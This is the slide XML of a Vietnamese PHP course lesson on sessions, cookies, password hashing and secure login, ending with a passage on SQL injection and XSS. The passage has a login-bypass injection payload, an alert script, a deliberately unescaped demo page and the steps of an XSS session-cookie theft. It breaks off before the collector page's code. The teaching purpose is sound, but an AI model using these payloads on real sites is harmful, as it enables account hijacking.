              <a:t>1.6. Session ID và cookie phối hợp thế nào (8/11)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1800" b="0"/>
              <a:t>Vì vậy ID phải </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="1"/>
              <a:t>dài và không đoán được</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> (PHP dùng bộ sinh số ngẫu nhiên an toàn mật mã). Ai biết ID của người khác thì server </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="1"/>
              <a:t>coi họ chính là người đó</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> — đây là lý do bài XSS ở mục 2.5 nguy hiểm.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" i="1" b="0">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Thử ngay: đăng nhập rồi mở DevTools → *Application* → *Cookies* → thấy </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1700" i="1" b="0">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>PHPSESSID</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1700" i="1" b="0">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
              </a:rPr>
              <a:t>. Đồng thời mở </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1700" i="1" b="0">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>C:/xampp/tmp/</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1700" i="1" b="0">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
              </a:rPr>
              <a:t> thấy file </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1700" i="1" b="0">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>sess_...</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1700" i="1" b="0">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
              </a:rPr>
              <a:t> trùng giá trị đó.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="1"/>
              <a:t>Có tùy biến được không? — Có</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t>, ở mọi bước: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/>
              <a:t>1.6. Session ID và cookie phối hợp thế nào (9/11)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412480" cy="3082290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&lt;?php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// PHAI goi TRUOC session_start()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session_name("COURSE8SID");          // doi ten cookie (mac dinh PHPSESSID)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session_set_cookie_params([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"lifetime" =&gt; 0,                 // 0 = het khi dong trinh duyet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"path"     =&gt; "/",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"secure"   =&gt; false,             // true khi chay HTTPS (production)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"httponly" =&gt; true,              // JS khong doc duoc cookie nay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"samesite" =&gt; "Lax",             // han che gui cookie tu trang khac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]);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ini_set("session.gc_maxlifetime", 1800);   // du lieu song 30 phut khong hoat dong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session_start();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?&gt;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/>
              <a:t>1.6. Session ID và cookie phối hợp thế nào (10/11)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Muốn tùy biến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Cách làm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/>
                        <a:t>Tên cookie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session_name()</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t> hoặc </a:t>
                      </a:r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session.name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/>
                        <a:t>Thuộc tính cookie (hạn, </a:t>
                      </a:r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HttpOnly</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t>, </a:t>
                      </a:r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Secure</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t>, </a:t>
                      </a:r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SameSite</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t>)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session_set_cookie_params()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/>
                        <a:t>Thư mục lưu file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session_save_path()</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t> hoặc </a:t>
                      </a:r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session.save_path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/>
                        <a:t>Thời gian sống dữ liệu phía server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session.gc_maxlifetime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1"/>
                        <a:t>Nơi lưu</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t> (CSDL, Redis, Memcached)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/>
                        <a:t>Tự viết lớp </a:t>
                      </a:r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SessionHandlerInterface</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t> rồi </a:t>
                      </a:r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session_set_save_handler()</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t>, hoặc cấu hình </a:t>
                      </a:r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session.save_handler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/>
                        <a:t>Cấp ID mới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session_regenerate_id(true)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="54864" marR="54864" marT="27432" marB="27432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/>
              <a:t>1.6. Session ID và cookie phối hợp thế nào (11/11)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2000" b="0"/>
              <a:t>Các tùy chọn này cũng đặt được trong </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>php.ini</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t> để áp dụng cho cả server. Ở project lớn, dữ liệu session thường chuyển sang </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="1"/>
              <a:t>Redis/CSDL</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t> để nhiều server dùng chung — nhưng cơ chế *cookie chứa ID → server tra dữ liệu* vẫn y hệt.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/>
              <a:t>Tiết 2 — Cookie, đăng nhập &amp; bảo mật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2.1. Cookie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412480" cy="4018280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&lt;?php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// Cu phap: setcookie(name, value, expire, path, domain, secure, httponly)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$thoiHan = time() + (7 * 24 * 60 * 60);   // 7 ngay tinh bang giay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setcookie("remember_user", "ngoctb", $thoiHan, "/");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// Doc cookie (chi co o request TIEP THEO, khong doc duoc ngay sau khi set)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if (isset($_COOKIE["remember_user"]))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echo "Chào mừng trở lại: " . htmlspecialchars($_COOKIE["remember_user"]);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// Xoa cookie: dat thoi han vao qua khu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setcookie("remember_user", "", time() - 3600, "/");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// Cu phap hien dai (PHP 7.3+): truyen mang tuy chon, co them samesite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setcookie("theme", "dark", [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"expires"  =&gt; time() + 86400,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"path"     =&gt; "/",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"httponly" =&gt; true,     // JavaScript khong doc duoc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"samesite" =&gt; "Lax",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]);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?&gt;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2.1. Cookie (2/3)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Session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Cookie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/>
                        <a:t>Nơi lưu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/>
                        <a:t>Server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/>
                        <a:t>Máy người dùng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/>
                        <a:t>An toàn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/>
                        <a:t>Cao hơn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/>
                        <a:t>Thấp — người dùng sửa được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/>
                        <a:t>Thời gian sống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/>
                        <a:t>Cookie chứa ID hết khi đóng trình duyệt; dữ liệu trên server bị dọn sau ~24 phút không hoạt động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/>
                        <a:t>Theo </a:t>
                      </a:r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expire</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t> đặt trước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/>
                        <a:t>Dung lượng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/>
                        <a:t>Lớn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/>
                        <a:t>~4KB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/>
                        <a:t>Dùng cho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/>
                        <a:t>Trạng thái đăng nhập, giỏ hàng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/>
                        <a:t>"Remember me", tùy chọn hiển thị</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="54864" marR="54864" marT="27432" marB="27432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2.1. Cookie (3/3)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800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1900" i="1" b="1">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Nguyên tắc vàng:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1900" i="1" b="0">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
              </a:rPr>
              <a:t> thông tin quyết định </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1900" i="1" b="1">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
              </a:rPr>
              <a:t>quyền hạn</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1900" i="1" b="0">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
              </a:rPr>
              <a:t> (đã đăng nhập chưa, có phải admin không) phải nằm ở </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1900" i="1" b="1">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Session</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1900" i="1" b="0">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
              </a:rPr>
              <a:t>. Cookie chỉ để gợi nhớ những thứ vô hại.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2.2. Băm mật khẩu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412480" cy="2316480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&lt;?php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// Khi dang ky: bam mat khau truoc khi luu vao CSDL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$matKhauHash = password_hash("123456", PASSWORD_DEFAULT);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// Ket qua dang: $2y$10$N9qo8uLOickgx2ZMRZoMy...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// Khi dang nhap: so sanh mat khau nhap vao voi hash trong CSDL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if (password_verify($matKhauNhapVao, $hashTrongCSDL))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echo "Đúng mật khẩu";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?&gt;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2.2. Băm mật khẩu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/>
              <a:t>Cập nhật dữ liệu mẫu buổi 3 (mật khẩu đang lưu dạng thô):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664208"/>
            <a:ext cx="8412480" cy="2333497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&lt;?php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// File chay 1 lan: tools/hash_password.php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require_once "../app/common/dbConnect.php";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$users = $conn-&gt;query("SELECT id, password FROM user")-&gt;fetchAll();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foreach ($users as $u)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$hash = password_hash($u["password"], PASSWORD_DEFAULT);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$stmt = $conn-&gt;prepare("UPDATE user SET password = :p WHERE id = :id");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$stmt-&gt;execute(["p" =&gt; $hash, "id" =&gt; $u["id"]]);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echo "Đã băm xong mật khẩu.";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?&gt;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/>
              <a:t>2.3. Luồng đăng nhập hoàn chỉnh (1/6)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/>
              <a:t>Đây là bản </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" b="1"/>
              <a:t>cơ bản</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" b="0"/>
              <a:t> để hiểu luồng. Bản có timeout và cấu hình cookie an toàn nằm ở mục 2.6.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664208"/>
            <a:ext cx="8412480" cy="4358640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&lt;?php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// File: login.php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session_start();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require_once "app/common/dbConnect.php";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require_once "app/common/commonFuncs.php";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$thongBaoLoi = "";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if ($_SERVER["REQUEST_METHOD"] === "POST")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$username = trim($_POST["username"] ?? "");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$password = $_POST["password"] ?? "";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$nhoToi   = isset($_POST["remember"]);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if ($username === "" || $password === "")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$thongBaoLoi = "Yêu cầu nhập đủ tên đăng nhập và mật khẩu";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} else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        // Truy van an toan bang prepared statement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$user = truyVanMotDong($conn,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    "SELECT * FROM user WHERE username = :username",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    ["username" =&gt; $username]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if ($user &amp;&amp; password_verify($password, $user["password"]))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            // BAT BUOC: cap session ID moi ngay sau khi dang nhap thanh cong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/>
              <a:t>2.3. Luồng đăng nhập hoàn chỉnh (2/6)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412480" cy="4358640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            // (chong session fixation - giai thich o muc 2.6)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    session_regenerate_id(true);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    $_SESSION["user_id"]  = $user["id"];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    $_SESSION["username"] = $user["username"];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    $_SESSION["fullname"] = $user["fullname"];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    $_SESSION["is_admin"] = (int)$user["is_admin"];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            // Moc thoi gian de kiem tra timeout (xem muc 2.6)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    $_SESSION["login_time"]    = time();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    $_SESSION["last_activity"] = time();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    if ($nhoToi)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        setcookie("remember_user", $user["username"], time() + 7 * 86400, "/");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  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    header("Location: index.php");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    exit();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} else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            // Bao loi chung chung, khong noi ro sai username hay sai password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    $thongBaoLoi = "Tên đăng nhập hoặc mật khẩu không đúng";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}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/>
              <a:t>2.3. Luồng đăng nhập hoàn chỉnh (3/6)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412480" cy="4188460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$pageTitle = "Đăng nhập";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include "app/view/header.php";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?&gt;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&lt;h2&gt;Đăng nhập&lt;/h2&gt;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&lt;?php if ($thongBaoLoi !== ""): ?&gt;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&lt;p style="color:red"&gt;&lt;?= $thongBaoLoi ?&gt;&lt;/p&gt;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&lt;?php endif; ?&gt;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&lt;form method="post"&gt;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&lt;p&gt;Tên đăng nhập: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&lt;input type="text" name="username"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   value="&lt;?= anToan($_COOKIE["remember_user"] ?? "") ?&gt;"&gt;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&lt;/p&gt;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&lt;p&gt;Mật khẩu: &lt;input type="password" name="password"&gt;&lt;/p&gt;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&lt;p&gt;&lt;label&gt;&lt;input type="checkbox" name="remember"&gt; Ghi nhớ đăng nhập&lt;/label&gt;&lt;/p&gt;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&lt;p&gt;&lt;button type="submit"&gt;Đăng nhập&lt;/button&gt;&lt;/p&gt;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&lt;p&gt;&lt;a href="register.php"&gt;Đăng ký tài khoản&lt;/a&gt; | &lt;a href="#"&gt;Quên mật khẩu&lt;/a&gt;&lt;/p&gt;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&lt;/form&gt;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&lt;?php include "app/view/footer.php"; ?&gt;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/>
              <a:t>2.3. Luồng đăng nhập hoàn chỉnh (4/6)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/>
              <a:t>Bảo vệ trang cần đăng nhập</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" b="0"/>
              <a:t> — tạo </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>app/common/checkLogin.php</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" b="0"/>
              <a:t>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664208"/>
            <a:ext cx="8412480" cy="3831082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&lt;?php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// File: app/common/checkLogin.php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if (session_status() === PHP_SESSION_NONE)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session_start();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// Chua dang nhap -&gt; day ve trang login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if (!isset($_SESSION["user_id"]))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header("Location: login.php");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exit();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// Ham kiem tra quyen admin, goi o cac trang quan tri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function yeuCauAdmin()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if (($_SESSION["is_admin"] ?? 0) !== 1)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die("Bạn không có quyền truy cập trang này.");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?&gt;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/>
              <a:t>2.3. Luồng đăng nhập hoàn chỉnh (5/6)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/>
              <a:t>Dùng ở đầu mọi trang quản trị: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664208"/>
            <a:ext cx="8412480" cy="1703832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&lt;?php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require_once "app/common/checkLogin.php";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yeuCauAdmin();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require_once "app/common/dbConnect.php";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// ... phan con lai cua trang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?&gt;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/>
              <a:t>2.3. Luồng đăng nhập hoàn chỉnh (6/6)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/>
              <a:t>Đăng xuất</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" b="0"/>
              <a:t> — </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>logout.php</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" b="0"/>
              <a:t>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664208"/>
            <a:ext cx="8412480" cy="2180336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&lt;?php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session_start();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$_SESSION = [];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session_destroy();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setcookie("remember_user", "", time() - 3600, "/");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header("Location: login.php");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exit();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?&gt;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/>
              <a:t>2.4. SQL Injection &amp; XSS cơ bản (1/6)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/>
              <a:t>SQL Injection — demo tấn công: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664208"/>
            <a:ext cx="8412480" cy="1210310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&lt;?php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// Code SAI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$sql = "SELECT * FROM user WHERE username = '" . $_POST["username"] . "'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AND password = '" . $_POST["password"] . "'";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?&gt;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/>
              <a:t>2.4. SQL Injection &amp; XSS cơ bản (2/6)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/>
              <a:t>Nhập username: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>admin' -- </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" b="0"/>
              <a:t> → câu lệnh thành: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664208"/>
            <a:ext cx="8412480" cy="731520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SELECT * FROM user WHERE username = 'admin' -- ' AND password = '...'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/>
              <a:t>2.4. SQL Injection &amp; XSS cơ bản (3/6)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2000" b="0"/>
              <a:t>Phần sau </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>--</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t> bị coi là comment → </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="1"/>
              <a:t>đăng nhập được mà không cần mật khẩu</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t>*Cách chặn:* luôn dùng prepared statement (đã học buổi 4).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="1"/>
              <a:t>XSS — demo tấn công:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t> người dùng nhập tên sản phẩm là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/>
              <a:t>2.4. SQL Injection &amp; XSS cơ bản (4/6)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412480" cy="731520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&lt;script&gt;alert('Bị hack!')&lt;/script&gt;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/>
              <a:t>2.4. SQL Injection &amp; XSS cơ bản (5/6)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1800" b="0"/>
              <a:t>Nếu in thẳng ra HTML, script sẽ chạy trên trình duyệt của mọi người xem trang.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t>*Cách chặn:* mọi dữ liệu do người dùng nhập, khi in ra HTML phải qua </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>htmlspecialchars()</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> — chính là hàm </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>anToan()</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> đã viết ở buổi 4.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>alert()</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> chỉ để chứng minh script chạy được. Mục 2.5 cho thấy kẻ tấn công làm gì </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="1"/>
              <a:t>thật sự</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="1"/>
              <a:t>Bảng tổng kết phòng thủ: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/>
              <a:t>2.4. SQL Injection &amp; XSS cơ bản (6/6)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Nguy cơ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Cách chặn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/>
                        <a:t>SQL Injection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/>
                        <a:t>Prepared statement với tham số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/>
                        <a:t>XSS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htmlspecialchars()</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t> khi xuất ra HTML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/>
                        <a:t>Lộ mật khẩu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password_hash()</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t> / </a:t>
                      </a:r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password_verify()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/>
                        <a:t>Người dùng tự nâng quyền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/>
                        <a:t>Kiểm tra </a:t>
                      </a:r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is_admin</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t> từ </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="1"/>
                        <a:t>Session</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t>, không lấy từ form/cookie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/>
                        <a:t>Session fixation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session_regenerate_id(true)</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t> sau khi đăng nhập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/>
                        <a:t>Session hijacking (qua XSS)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anToan()</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t> + cookie </a:t>
                      </a:r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HttpOnly</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t> + </a:t>
                      </a:r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Secure</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t> + </a:t>
                      </a:r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SameSite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/>
                        <a:t>Session ID sống quá lâu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/>
                        <a:t>Idle timeout + absolute timeout kiểm tra </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="1"/>
                        <a:t>phía server</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t> (mục 2.6)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="54864" marR="54864" marT="27432" marB="27432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/>
              <a:t>2.5. XSS đánh cắp Session ID — demo (1/12)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800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" i="1" b="0">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
              </a:rPr>
              <a:t>⚠️ </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1700" i="1" b="1">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Chỉ thực hành trên máy local của mình, với dữ liệu mẫu.</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1700" i="1" b="0">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Dùng kỹ thuật này lên website của người khác là vi phạm pháp luật.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="1"/>
              <a:t>Ý tưởng:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> nếu kẻ tấn công chèn được JavaScript vào trang, script đó chạy </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="1"/>
              <a:t>với tư cách trang web nạn nhân</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> nên đọc được </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>document.cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> — trong đó có </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>PHPSESSID</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t>. Gửi </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>PHPSESSID</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> về máy mình, kẻ tấn công dán vào trình duyệt của mình và </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="1"/>
              <a:t>trở thành người đó</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t>, không cần biết mật khẩu.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/>
              <a:t>2.5. XSS đánh cắp Session ID — demo (2/12)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412480" cy="1942084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1. Hacker nhap ten san pham chua &lt;script&gt; ---&gt; luu vao CSDL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2. Admin mo trang danh sach san pham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3. Trinh duyet admin chay &lt;script&gt;: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doc document.cookie ("PHPSESSID=k3j9x2...")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gui ve site cua hacker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4. Hacker nhan duoc PHPSESSID, dan vao trinh duyet cua minh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5. Server thay dung ID -&gt; coi hacker la admin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/>
              <a:t>2.5. XSS đánh cắp Session ID — demo (3/12)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1800" b="1"/>
              <a:t>Bước 0 — chuẩn bị 2 "website".</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> Nạn nhân: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>http://localhost/course8/</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t>. Kẻ tấn công: dùng địa chỉ khác </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>http://127.0.0.1/attacker/</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> (khác host nên là một site khác hẳn, cookie của </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>localhost</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> không tự gửi sang đó). Tạo thư mục </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>C:/xampp/htdocs/attacker/</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="1"/>
              <a:t>Bước 1 — trang có lỗi</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>xss_demo.php</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> (cố ý </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="1"/>
              <a:t>không</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> dùng </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>anToan()</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t>):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/>
              <a:t>2.5. XSS đánh cắp Session ID — demo (4/12)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412480" cy="4358640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&lt;?php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// File: xss_demo.php - TRANG CO LOI, chi dung de demo tren may local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session_start();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require_once "app/common/dbConnect.php";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require_once "app/common/commonFuncs.php";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// Gia lap da dang nhap admin de co PHPSESSID de bi danh cap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$_SESSION["user_id"]  = 1;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$_SESSION["username"] = "admin";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$_SESSION["is_admin"] = 1;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if ($_SERVER["REQUEST_METHOD"] === "POST")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    // Luu nguyen van (dung prepared statement nen khong bi SQLi)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thucThi($conn,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"INSERT INTO product (name, price, category_id) VALUES (:n, 0, 1)",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["n" =&gt; $_POST["name"]]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$ds = truyVanNhieuDong($conn, "SELECT id, name FROM product ORDER BY id DESC");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?&gt;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&lt;form method="post"&gt;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Tên sản phẩm: &lt;input name="name" size="80"&gt;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&lt;button&gt;Thêm&lt;/button&gt;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/>
              <a:t>2.5. XSS đánh cắp Session ID — demo (5/12)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412480" cy="1703832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&lt;/form&gt;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&lt;?php foreach ($ds as $sp): ?&gt;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&lt;p&gt;&lt;?= $sp["name"] ?&gt;&lt;/p&gt;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&lt;?php endforeach; ?&gt;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/>
              <a:t>2.5. XSS đánh cắp Session ID — demo (6/12)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/>
              <a:t>Bước 2 — trang thu cookie của kẻ tấn công</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" b="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
